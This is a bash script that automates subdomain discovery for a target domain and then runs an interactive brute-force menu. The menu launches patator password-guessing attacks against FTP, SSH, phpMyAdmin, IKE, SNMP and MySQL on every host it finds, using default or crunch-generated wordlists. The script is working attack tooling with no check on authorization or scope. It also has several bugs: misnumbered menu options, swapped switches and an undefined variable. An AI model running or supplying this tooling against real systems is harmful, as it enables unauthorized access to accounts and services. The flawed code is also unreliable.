#!/bin/bash
echo "All in 1 script"
echo "USE SWITCH -a to run all scripts at Once or -B for Hail-Mairy/Brute-force-everything"
echo "This script assumes that all the tools required are installed and accessible"
echo "####################### - REQUIREMENTS - ############################"
echo "1. altdns"
echo "2. sublist3r"
echo "3. massdns"
echo "4. amass"
echo "5. dnsrecon"
echo "6. Patator"

d=$(date +%H-%M-%d-%b-%Y)
echo "$d"
domain=""
setsize=0

run_core_brute(){
    echo "would you like to specify a username and password file ?(Y/N)"
    read up
    if [ "$up" = "Y" ] || [ "$up" = "y" ];then
        echo "specify USERNAME file"
        read U
        USERNAME=$U
        echo "specify PASSWORD file"
        read P
        PASSWORD=$P
    elif [ "$up" = "N" ] || [ "$up" = "n" ];then
        echo "would you like to use default passwords list or Generate? (Default(D)/Generate(G))"
        read check
        if [ "$check" = "D" ] || [ "$check" = "Default" ];then
            USERNAME=100mostusername_cn.txt
            PASSWORD=chinese_pass.txt
        elif [ "$check" = "G" ] || [ "$check" = "Generate" ];then
            test -e ../dir$domain/${domain}_wordlist.lst && PASSWORD=../dir$domain/${domain}_wordlist.lst || run_crunch
            USERNAME=100mostusername_cn.txt
            PASSWORD=../dir$domain/${domain}_wordlist.lst    
        fi
    fi
    echo "Would You Like to Brute subdomains ? (Y/N)"
    read sb 
    if [ "$sb" = "Y" ] || [ "$sb" = "y" ];then
        dns_recon
        alt_dns
        sub_list3r
        mass_dns
        amass_recon
        run_resolver_for_brute
        echo "Please specify Service to attack"
        echo "1. FTP"
        echo "2. SSH"
        echo "3. PHP-Login"
        echo "4. IKE"
        echo "5. SNMP"
        echo "6. MySQL"
        echo "7. All"
        echo "0. Exit"
        read Service
        case $Service in
            1) run_brute_ftp_subdomain ;;
            2) run_brute_ssh_subdomain ;;
            3) run_brute_phplogin_subdomain ;;
            4) run_brute_snmp_subdomain ;;
            5) run_brute_mysql_subdomain ;;
            6) run_all_brute_subdomain ;;
            7) run_all_brute_subdomain ;;
            0) exit ;;
        esac
        
    else
        echo "Please specify Service to attack"
        echo "1. FTP"
        echo "2. SSH"
        echo "3. PHP-Login"
        echo "4. IKE"
        echo "5. SNMP"
        echo "6. MySQL"
        echo "7. All"
        echo "0. Exit"
        read Service
        case $Service in
            1) run_brute_ftp ;;
            2) run_brute_ssh ;;
            3) run_brute_phplogin ;;
            4) run_brute_ike ;;
            5) run_brute_snmp ;;
            6) run_brute_mysql ;;
            7) run_all_brute ;;
            0) exit ;;
        esac
        
    fi      
}

run_all_brute_subdomain(){
    run_brute_ftp_subdomain
    run_brute_ssh_subdomain
    run_brute_phplogin_subdomain
    run_brute_ike_subdomain
    run_brute_snmp_subdomain
    run_brute_mysql_subdomain
    exit
}


run_all_brute(){
    run_brute_ftp
    run_brute_ssh
    run_brute_phplogin
    run_brute_ike
    run_brute_snmp
    run_brute_mysql
    exit
}

run_brute_ftp(){
    run_resolver
    while read line;do
        patator ftp_login host=$line user=FILE0 0=$USERNAME password=FILE1 1=$PASSWORD -x ignore:mesg='Login incorrect.' -x ignore,reset,retry:code=500
    done < ../dir$domain/resolved_$domain.txt
}

run_brute_ftp_subdomain(){
    while read line;do
        patator ftp_login host=$line user=FILE0 0=$USERNAME password=FILE1 1=$PASSWORD -x ignore:mesg='Login incorrect.' -x ignore,reset,retry:code=500
    done < ../dir${domain}/domains.txt
}

run_brute_ssh(){
    run_resolver
    while read line;do
        patator ssh_login host=$line user=FILE0 0=$USERNAME password=FILE1 1=$PASSWORD --max-retries 0 --timeout 10 -x ignore:time=0-3
    done < ../dir$domain/resolved_$domain.txt
}

run_brute_ssh_subdomain(){
    while read line;do
        patator ssh_login host=$line user=FILE0 0=$USERNAME password=FILE1 1=$PASSWORD --max-retries 0 --timeout 10 -x ignore:time=0-3
    done < ../dir${domain}/domains.txt
}

run_brute_phplogin(){
    run_resolver
    while read line;do
        patator http_fuzz url=http://$line/pma/index.php method=POST body='pma_username=COMBO00&pma_password=COMBO01&server=1&target=index.php&lang=en&token=' 0=$arg2 before_urls=http://$line/pma/index.php accept_cookie=1 follow=1 -x ignore:fgrep='Cannot log in to the MySQL server' -l /tmp/qsdf
    done < ../dir$domain/resolved_$domain.txt
}

run_brute_phplogin_subdomain(){
    while read line;do
        patator http_fuzz url=http://$line/pma/index.php method=POST body='pma_username=COMBO00&pma_password=COMBO01&server=1&target=index.php&lang=en&token=' 0=$arg2 before_urls=http://$line/pma/index.php accept_cookie=1 follow=1 -x ignore:fgrep='Cannot log in to the MySQL server' -l /tmp/qsdf
    done < ../dir${domain}/domains.txt
}

run_brute_ike(){
    run_resolver
    while read line;do
        patator ike_enum host=$line transform=MOD0 0=TRANS aggressive=RANGE1 1=int:0-1 -x ignore:fgrep='NO-PROPOSAL'
    done < ../dir$domain/resolved_$domain.txt
}

run_brute_ike_subdomain(){
    while read line;do
        patator ike_enum host=$line transform=MOD0 0=TRANS aggressive=RANGE1 1=int:0-1 -x ignore:fgrep='NO-PROPOSAL'
    done < ../dir${domain}/domains.txt
}

run_brute_snmp(){
    run_resolver
    while read line;do
        patator snmp_login host=$line version=3 user=FILE0 0=$USERNAME -x ignore:mesg=unknownUserName
    done < ../dir$domain/resolved_$domain.txt
}

run_brute_snmp_subdomain(){
    run_resolver
    while read line;do
        patator snmp_login host=$line version=3 user=FILE0 0=$USERNAME -x ignore:mesg=unknownUserName
    done < ../dir${domain}/domains.txt
}

run_brute_snmpv3(){
    echo "Please Specify auth_key file"
    read auth_key
    run_resolver
    while read line;do
        patator snmp_login host=$line version=3 user=FILE0 auth_key=FILE1 0=$USERNAME 1=$auth_key -x ignore:mesg=wrongDigest
    done < ../dir$domain/resolved_$domain.txt
}

run_brute_snmpv3_subdomain(){
    echo "Please Specify auth_key file"
    read auth_key
    run_resolver
    while read line;do
        patator snmp_login host=$line version=3 user=FILE0 auth_key=FILE1 0=$USERNAME 1=$auth_key -x ignore:mesg=wrongDigest
    done < ../dir${domain}/domains.txt
}

run_brute_mysql(){
    run_resolver
    while read line;do
        patator mysql_login host=$line user=FILE0 password=FILE1 0=$USERNAME 1=$PASSWORD -x ignore:mesg='Login incorrect.' -x ignore,reset,retry:code=500
    done < ../dir$domain/resolved_$domain.txt
}

run_brute_mysql_subdomain(){
    while read line;do
        patator mysql_login host=$line user=FILE0 password=FILE1 0=$USERNAME 1=$PASSWORD -x ignore:mesg='Login incorrect.' -x ignore,reset,retry:code=500
    done < ../dir${domain}/domains.txt
}

dns_recon(){
        dnsrecon -d $domain -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ag >> ../dir$domain/domains_recon.txt
        cat ../dir$domain/domains_recon.txt | grep " A " | cut -d "A" -f 2 | cut -d " " -f 2 >> ../dir$domain/domains.txt
}

alt_dns(){
        cat ../dir$domain/domains.txt | sort | uniq > ../dir$domain/domainsnew.txt
        mv ../dir$domain/domainsnew.txt ../dir$domain/domains.txt
        altdns -i ../dir$domain/domains.txt -o ../dir$domain/altdns_data_output.txt  -r -s ../dir$domain/altdns_domains.txt
        cat ../dir$domain/altdns_domains.txt >> ../dir$domain/domains.txt
}

sub_list3r(){
        python Sublist3r/sublist3r.py -o ../dir$domain/domains_sublistr.txt -d $domain
        cat ../dir$domain/domains_sublistr.txt >> ../dir$domain/domains.txt


}

mass_dns(){
        red=`tput setaf 1`
        reset=`tput sgr0`

#        echo "enter domain:"

        #domain=$domain

#       echo "enter the maximum subdomain length:"

#       read setsize

        string=.$domain

        len=${#string}

for i in $(seq 1 $setsize); do

        fullsize=$(($i + $len))
        echo $setsize  $len $i $fullsize
        j=$(printf "%${i}s\n" '' | tr ' ' @)
        echo crunch ${fullsize} ${fullsize} -f /usr/share/crunch/charset.lst  domain -t $j$string \| massdns/bin/./massdns -s 1000 -t A -o S -r resolvers.txt --flush -w  ../dir${domain}/result_${domain}_${i}.txt
        crunch ${fullsize} ${fullsize} -f /usr/share/crunch/charset.lst  domain -t $j$string | massdns/bin/./massdns -s 1000 -t A -o S -r resolvers.txt --flush -q -w  ../dir${domain}/massdns_${domain}_${i}.txt
        cat ../dir${domain}/massdns_${domain}_${i}.txt | cut -d " " -f1 | sed 's/.$//' >>  ../dir${domain}/domains.txt
done
}

amass_recon(){
        amass enum  -brute -min-for-recursive 3 -d $domain -o ../dir${domain}/domains_amass.txt
        cat ../dir${domain}/domains_amass.txt >> ../dir${domain}/domains.txt
}


run_subdomain3(){
        cd subdomain3
        mkdir -p result/output
        python2 brutedns.py -d $arg2 -s fast -l 5
        cd ..
}

run_onesixtyone(){
        run_resolver
        while read line;do
                onesixtyone -i $line -o ../dir${domain}/snmponesixtyone_output.txt
        done < ../dir$domain/resolved_$domain.txt
}

run_theHarvester(){
        theHarvester -d $domain -l 500 -g -f ../dir${domain}/harvester_output.txt -b all
}

run_crunch(){
        echo "We are running crunch module to generate a password list, We would like to ask you a few questions is it okay? (Y/N)?"
        read x
        if [ "$x" = "Y" ] || [ "$x" = "y" ];then
                echo "enter starting word"
                read s
                z=${#s}
#                echo "max range( greater than or equal to $z):"
#                read a
                echo "enter charset file location:"
                read y
                test -e $y && echo "Found" || echo "Run the script again with correct file location"
                echo "Would you like to specify your charset from file? (Y/N)"
                read c 
#                echo "enter output file:"
#                read o
                if [ "$c" = "N" ] || [ "$c" = "n" ];then
                        crunch $z $z -f $y mixalpha-numeric-all-space -s $s -o ../dir$domain/${domain}_wordlist.lst
                else
                        echo "enter charset from file"
                        read f
                        crunch $z $a -f $y $f -s $s -o ../dir$domain/${domain}_wordlist.lst
                fi
        else
                exit
        fi
}

run_resolver(){
    dig +short $domain > ../dir$domain/resolved_$domain.txt
}
run_resolver_for_brute(){
    while read line;do
         dig +short $line > ../dir$domain/domains_for_brute.txt
    done < ../dir${domain}/domains.txt
}
domain=$2
arg2="$3"
arg3="$4"
arg4="$5"
if [ -n "$domain" ];then
    mkdir -p ../dir${domain}/
fi

if [ -z "$1" ];then
        echo "Usage ./auto-script.sh [-h] [-t] [-c] [-s] [-n] [-B]"
        exit
elif [ "$1" == "-dr" ];then
        dns_recon
       exit
elif [ "$1" == "-ad" ];then
        sub_list3r
        exit
elif [ "$1" == "-sl" ];then
        alt_dns
        exit
elif [ "$1" == "-md" ];then
        mass_dns
        exit
elif [ "$1" == "-am" ];then
        amass
        exit
elif [ "$1" == "-o" ];then
#       onesixtyone -c /usr/share/sparta/wordlists/snmp-default.txt -o snmp_one_sixtyone${2}.txt
        run_onesixtyone $domain
        exit
elif [ "$1" == "-t" ];then
#       theHarvester -d $2 -l 500 -g -f output.txt -b all
        run_theHarvester $domain
        exit
elif [ "$1" == "-c" ];then
#       crunch 6 15 0123456789abcdef -o 15chars.txt
        run_crunch
        exit
elif [ "$1" == "-d" ];then
        run_resolver
        exit
elif [ "$1" == "-s3" ];then
        run_subdomain3
        exit
elif [ "$1" == "-a" ];then
    echo "Running All Scripts . Please Be Patient"
    mkdir -p ../dir$domain/
    echo "enter the maximum subdomain length:"
    read  setsize
    dns_recon
    sleep 10
    sub_list3r
    sleep 10
    amass_recon
    sleep 10
#    run_subdomain3
#    sleep 10
    mass_dns
    sleep 10
    alt_dns
    sleep 10
#       run_onesixtyone $domain
#        sleep 10
#       run_theHarvester $domain
#        sleep 10
    echo "Everything Finished"
    exit
elif [ "$1" == "-B" ];then
    run_core_brute
    sleep 6 
    exit
elif [ "$1" == "-debug" ];then
    mass_dns
    exit
else
        echo "-h : This Help Message"
        echo "-t : Runs theHarvester"
        echo "-c : Runs Crunch"
        echo "-r : Runs Rpc_scan"
        echo "-o : Runs OnesixtyOne"
        echo "-a : All Scans at Once"
        echo "-B : Brute-force Menu "
fi
